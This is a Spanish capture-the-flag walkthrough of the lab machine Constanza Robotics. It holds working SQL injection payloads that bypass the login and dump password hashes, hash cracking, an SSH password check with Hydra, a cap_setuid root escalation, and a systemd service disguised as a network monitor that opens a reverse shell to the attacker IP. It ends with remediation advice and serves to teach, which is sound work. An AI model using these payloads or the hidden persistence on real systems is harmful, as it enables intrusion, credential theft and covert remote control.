---
title: "TheHackersLabs: Constanza Robotics"
date: 2026-08-25
draft: false
tags: ["ctf", "thehackerslabs", "sql-injection", "union-based", "privilege-escalation", "capabilities", "persistencia"]
categories: ["writeups"]
summary: "Explotación de una inyección SQL en un formulario de login para eludir autenticación y extraer credenciales mediante UNION SELECT, cracking de hashes MD5, validación de credenciales por SSH, escalada de privilegios abusando de una capability cap_setuid sobre un script Python, y persistencia mediante un servicio systemd."
---

*Recorrido completo de la máquina Constanza Robotics: bypass de autenticación por inyección SQL en un formulario de login corporativo, extracción de credenciales de la base de datos mediante UNION SELECT, cracking de hashes MD5, acceso SSH por reutilización de contraseña, escalada de privilegios abusando de una capability Linux sobre un binario de backup, y persistencia mediante un servicio systemd con reverse shell.*

**Publicado el 25 de agosto de 2026 · Por Ne0t3k · 12 minutos de lectura**

IP objetivo: `192.168.0.63`. IP atacante: `192.168.0.55`.

## Reconocimiento — Descubrimiento de host y escaneo de puertos

Barrido de red para localizar el objetivo dentro del segmento:

<pre class="term-log">
<span class="cmd">$ nmap -sP 192.168.0.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:51 +0200
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.55
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 11.68 seconds
</pre>

Con el objetivo identificado (`192.168.0.63`), se fija como variable de entorno y se ejecuta un escaneo completo de puertos TCP con detección de servicio y scripts por defecto:

<pre class="term-log">
<span class="cmd">$ export TARGET=192.168.0.63</span>
<span class="cmd">$ sudo nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn -oN nmap_tcp_full.txt "$TARGET"</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:52 +0200
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
<span class="hl">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)</span>
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
<span class="hl">80/tcp   open  http    Apache httpd 2.4.68 ((Debian))</span>
|_http-title: Constanza Robotics — Robótica industrial de precisión
|_http-server-header: Apache/2.4.68 (Debian)
<span class="hl">3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)</span>
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
</pre>

![Salida completa del escaneo nmap TCP sobre Constanza Robotics](/images/writeups/constanza-robotics/01-nmap-tcp-full.png)

Tres puertos abiertos: **22/SSH** (OpenSSH 9.2p1), **80/HTTP** (Apache 2.4.68, portal corporativo "Constanza Robotics") y **3306/MySQL** (MariaDB, sin acceso autorizado desde el exterior).

## Enumeración web — Fuzzing de directorios y archivos

Fuzzing de rutas y archivos con extensiones habituales de backend, filtrando por tamaño de respuesta para descartar el ruido de páginas 403 genéricas:

<pre class="term-log">
<span class="cmd">$ ffuf -c -u "http://$TARGET/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -e .php,.html,.js,.txt,.bak -mc 200,204,301,302,307,401,403 -fs 7867 -rate 100 -t 30 -of json -o ffuf_root.json</span>

:: Method           : GET
:: URL              : http://192.168.0.63/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
:: Extensions       : .php .html .js .txt .bak
:: Output file      : ffuf_root.json
:: File format      : json
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 30
:: Matcher          : Response status: 200,204,301,302,307,401,403
:: Filter           : Response size: 7867

.php                    [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
<span class="hl">login.php               [Status: 200, Size: 1091, Words: 179, Lines: 30, Duration: 3ms]</span>
assets                  [Status: 301, Size: 353, Words: 21, Lines: 10, Duration: 0ms]
contacto.html           [Status: 200, Size: 4541, Words: 894, Lines: 102, Duration: 14ms]
productos.html          [Status: 200, Size: 6087, Words: 1339, Lines: 141, Duration: 11ms]
</pre>

![Resultado de la enumeración con ffuf sobre la raíz web](/images/writeups/constanza-robotics/02-ffuf-root-enumeration.png)

La ruta relevante es `login.php`, un formulario de acceso no enlazado desde la navegación pública. El resto (`contacto.html`, `productos.html`) forma parte de la web corporativa visible.

![Página principal de Constanza Robotics](/images/writeups/constanza-robotics/03-web-home.png)

![Formulario de acceso de empleados en login.php](/images/writeups/constanza-robotics/04-login-page.png)

## Explotación — Inyección SQL en el formulario de login

### Prueba de referencia

Antes de probar payloads, se establece la línea base con credenciales inválidas para conocer la respuesta de un login fallido normal:

```http
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=UTF-8

<div class="alert">Usuario o contraseña incorrectos.</div>
<form method="POST" action="login.php">
  ...
</form>
<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Respuesta 401 de referencia capturada en Burp Suite](/images/writeups/constanza-robotics/05-burp-baseline-401.png)

### Bypass de autenticación

Se sustituye el usuario por un payload de inyección SQL clásico para forzar que la condición `WHERE` sea siempre verdadera:

```http
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=' OR 1=1#&password=test
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="alert ok">
  Sesión iniciada como <strong>pperez</strong>
  (rol: user).
</div>
```

![Bypass de autenticación mediante inyección SQL, sesión iniciada como pperez](/images/writeups/constanza-robotics/06-burp-sqli-bypass.png)

El payload equivalente con el comentario nativo de MySQL (`-- -`) también funciona, confirmando ausencia total de saneamiento: las comillas, `OR`, `#` y espacios pasan sin modificación, lo que descarta la existencia de un WAF o de funciones de escapado como `addslashes()`.

### Conteo de columnas con ORDER BY

Al combinar el bypass con `ORDER BY`, se determina cuántas columnas devuelve la consulta original:

```
username=' OR 1=1 ORDER BY 1-- -&password=x   → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 2-- -&password=x   → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 3-- -&password=x   → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 4-- -&password=x   → falla / rompe el bypass
```

La consulta tiene exactamente **3 columnas**. Además, al forzar `ORDER BY 3` sin más condiciones, la sesión se inicia como un usuario distinto (`csalas`, rol `admin`), lo que sugiere que el orden de filas de la tabla influye en qué registro devuelve la consulta:

```http
POST /login.php HTTP/1.1
Content-Length: 46

username=' OR 1=1 ORDER BY 3-- -&password=test
```

```http
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>csalas</strong>
  (rol: admin).
</div>
```

![Confirmación de 3 columnas mediante ORDER BY, sesión como csalas/admin](/images/writeups/constanza-robotics/07-burp-order-by.png)

### Confirmación de reflexión con UNION SELECT

Con el número de columnas confirmado, se prueba una inyección UNION-based para verificar qué columnas se reflejan en la respuesta:

```http
POST /login.php HTTP/1.1
Content-Length: 62

username=' UNION SELECT 'colA','colB','colC'-- -&password=test
```

```http
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>colB</strong>
  (rol: colC).
</div>
```

![Reflexión confirmada de la segunda y tercera columna mediante UNION SELECT](/images/writeups/constanza-robotics/08-burp-union-reflection.png)

La aplicación refleja `colB` como nombre de usuario y `colC` como rol, confirmando que esas dos posiciones son las que se muestran en pantalla — el canal de extracción de datos para el resto de la explotación.

### Enumeración de tablas

Sustituyendo la segunda columna por una subconsulta contra `information_schema.tables`, se listan las tablas de la base de datos activa:

```http
username=' UNION SELECT 'colA',GROUP_CONCAT(table_name,0x7c),'x'
FROM information_schema.tables WHERE table_schema=database()-- -&password=test
```

```http
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>users|</strong>
  (rol: x).
</div>
```

![Enumeración de tablas de la base de datos mediante information_schema](/images/writeups/constanza-robotics/09-burp-tables-enumeration.png)

Se confirma la existencia de una tabla `users`.

### Extracción de credenciales

Con el nombre de la tabla confirmado, se extraen usuario, contraseña (hash) y rol de todos los registros en una sola petición, concatenados con `GROUP_CONCAT`:

```http
username=' UNION SELECT 'colA',GROUP_CONCAT(username,0x3a,password,0x3a,role,0x7c),'x'
FROM users-- -&password=test
```

```http
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>pperez:dea56e47f1c62c30b83b70eb281a6c39:user|,agomez:8afa847f50a716e64932d995c8e7435a:user|,jruiz:f25a2fc72690b780b2a14e140ef6a9e0:user|,csalas:0b04f0f2f8a079bf984225c01ba99a0d:admin|,mtorres:aaef70f35bbc718528c1e005e1e59d45:user|,dnavarro:dac8029f94f09117ad4f0dc5f70b69e1:user|</strong>
  (rol: x).
</div>
```

![Extracción completa de la tabla users: usuarios, hashes MD5 y roles](/images/writeups/constanza-robotics/10-burp-users-extraction.png)

Seis registros extraídos, cada uno con su hash y su rol.

### Causa raíz

La aplicación construye la consulta SQL mediante concatenación directa de la entrada de usuario, sin prepared statements ni sanitización:

```php
// Patrón vulnerable inferido
$query = "SELECT username, password, role FROM users WHERE username='$username' AND password='$password'";
```

## Cracking de credenciales

Los hashes extraídos se guardan en un fichero y se atacan con John the Ripper contra el diccionario `rockyou.txt`:

<pre class="term-log">
<span class="cmd">$ nano hashes.txt</span>
<span class="cmd">$ cat hashes.txt</span>
pperez:dea56e47f1c62c30b83b70eb281a6c39
agomez:8afa847f50a716e64932d995c8e7435a
jruiz:f25a2fc72690b780b2a14e140ef6a9e0
csalas:0b04f0f2f8a079bf984225c01ba99a0d
mtorres:aaef70f35bbc718528c1e005e1e59d45
dnavarro:dac8029f94f09117ad4f0dc5f70b69e1

<span class="cmd">$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span>
Using default input encoding: UTF-8
Loaded 6 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 3 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2026-08-24 23:25) 0g/s 32598Kp/s 32598Kc/s 97795KC/s fuckyooh21..*7¡Vamos!
Session completed.

<span class="cmd">$ john --show --format=raw-md5 hashes.txt</span>
<span class="hl-green">pperez:barcelona</span>
<span class="hl-green">agomez:princess</span>
<span class="hl-green">jruiz:iloveyou</span>
3 password hashes cracked, 3 left
</pre>

![Cracking de tres hashes MD5 con John the Ripper contra rockyou.txt](/images/writeups/constanza-robotics/11-john-md5-cracking.png)

Solo 3 de los 6 hashes se rompen contra el diccionario; los otros tres (incluido `csalas`, el único rol admin) resisten, lo que sugiere contraseñas más robustas o no presentes en `rockyou.txt`.

## Validación de credenciales — SSH

Se comprueba si alguna de las contraseñas obtenidas se reutiliza para el acceso SSH:

<pre class="term-log">
<span class="cmd">$ hydra -C creds.txt -t 1 ssh://192.168.0.63</span>
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-24 23:30:57
[DATA] max 1 task per 1 server, overall 1 task, 3 login tries, ~3 tries per task
[DATA] attacking ssh://192.168.0.63:22/
<span class="hl-green">[22][ssh] host: 192.168.0.63   login: pperez   password: barcelona</span>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-24 23:31:02
</pre>

![Validación de credenciales SSH con Hydra: pperez:barcelona válida](/images/writeups/constanza-robotics/12-hydra-ssh-validation.png)

La contraseña de `pperez` extraída de la base de datos web es la misma que usa para su cuenta del sistema: reutilización de credenciales entre servicios.

## Acceso inicial

<pre class="term-log">
<span class="cmd">$ ssh pperez@192.168.0.63</span>
The authenticity of host '192.168.0.63 (192.168.0.63)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.63' (ED25519) to the list of known hosts.
Linux TheHackersLabs 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64

pperez@TheHackersLabs:~$ whoami; id
pperez
uid=1001(pperez) gid=1001(pperez) grupos=1001(pperez)
pperez@TheHackersLabs:~$ cat user.txt
<span class="hl-green">THL{XXXXXXXXXXXXXXX}</span>
</pre>

## Escalada de privilegios — Capability cap_setuid

En vez de buscar binarios SUID, se enumeran capabilities de Linux asignadas directamente a ejecutables:

<pre class="term-log">
<span class="cmd">$ getcap -r / 2>/dev/null</span>
/usr/bin/ping cap_net_raw=ep
<span class="hl">/opt/maint/pybackup cap_setuid=ep</span>
</pre>

`/opt/maint/pybackup` tiene la capability `cap_setuid`, que permite a un proceso cambiar su UID efectivo a cualquier otro, incluido root, sin necesidad del bit SUID tradicional. Si el binario es un intérprete de Python (u otro lenguaje con `-c`), esto equivale a una escalada directa:

<pre class="term-log">
<span class="cmd">$ /opt/maint/pybackup -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'</span>
root@TheHackersLabs:~# id
uid=0(root) gid=1001(pperez) grupos=1001(pperez)
root@TheHackersLabs:~# cat /etc/shadow | head -3
root:yj9T$AA9oQMinlq3VEirU87hiR.$1Pdk6G.Cff4rXsZTFZ1FKVXtYOF3uuMjYdb50fIoXX2:20669:0:99999:7:::
daemon::20012:0:99999:7:::
bin::20012:0:99999:7:::
root@TheHackersLabs:~# cat /root/root.txt
<span class="hl-green">THL{XXXXXXXXXXXXXXXXXX}</span>
</pre>

`os.setuid(0)` eleva el UID efectivo del proceso a root, y el `execl` inmediato reemplaza el proceso por una bash con `-p` (preserva privilegios), heredando ese UID 0 sin necesidad de credenciales adicionales. Control administrativo total confirmado y flag de root localizada.

## Persistencia — Servicio systemd con reverse shell

Con root confirmado, se despliega un servicio systemd camuflado, que abre una reverse shell hacia la máquina atacante en cada arranque:

<pre class="term-log">
<span class="cmd">root@TheHackersLabs:~# nano /etc/systemd/system/network-monitor.service</span>
<span class="cmd">root@TheHackersLabs:~# cat /etc/systemd/system/network-monitor.service</span>
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
<span class="hl">ExecStart=/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.0.55/4444 0>&amp;1'</span>
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

root@TheHackersLabs:~# systemctl daemon-reload
root@TheHackersLabs:~# systemctl enable network-monitor.service
Created symlink /etc/systemd/system/multi-user.target.wants/network-monitor.service → /etc/systemd/system/network-monitor.service.
root@TheHackersLabs:~# systemctl start network-monitor.service
root@TheHackersLabs:~# systemctl is-enabled network-monitor.service
<span class="hl-green">enabled</span>
root@TheHackersLabs:~# systemctl status network-monitor.service
● network-monitor.service - Network Monitoring Service
     Loaded: loaded (/etc/systemd/system/network-monitor.service; enabled; preset: enabled)
     Active: active (running) since Mon 2026-08-24 23:52:30 CEST; 6s ago
   Main PID: 1112 (bash)
      Tasks: 2 (limit: 2315)
     Memory: 1016.0K
        CPU: 6ms
     CGroup: /system.slice/network-monitor.service
             ├─1112 /bin/bash -c "bash -i >&amp; /dev/tcp/192.168.0.55/4444 0>&amp;1"
             └─1113 bash -i

ago 24 23:52:30 TheHackersLabs systemd[1]: Started network-monitor.service - Network Monitoring Service.
</pre>

![Servicio systemd de persistencia activo y en ejecución](/images/writeups/constanza-robotics/14-systemd-persistence-service.png)

Verificación desde la máquina atacante:

<pre class="term-log">
<span class="cmd">$ nc -nlvp 4444</span>
listening on [any] 4444 ...
<span class="hl-green">connect to [192.168.0.55] from (UNKNOWN) [192.168.0.63] 46442</span>
bash: no se puede establecer el grupo de proceso de terminal (1112): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@TheHackersLabs:/# id && hostname
uid=0(root) gid=0(root) grupos=0(root)
TheHackersLabs
</pre>

![Reverse shell root recibida en el listener de la máquina atacante](/images/writeups/constanza-robotics/15-reverse-shell-root.png)

## Conclusión

La cadena de compromiso combina tres fallos independientes: una inyección SQL clásica por concatenación directa de entrada de usuario en el formulario de login, sin prepared statements ni validación; reutilización de contraseñas entre la aplicación web y las cuentas del sistema operativo; y una capability `cap_setuid` asignada a un script de mantenimiento (`pybackup`) que permite escalar a root sin depender de sudo ni de un binario SUID tradicional. Como medidas correctivas: uso de consultas parametrizadas (prepared statements) en toda la capa de autenticación, políticas de contraseñas distintas entre servicios web y de sistema, y auditoría periódica de capabilities asignadas con `getcap -r /` además de la habitual búsqueda de binarios SUID.
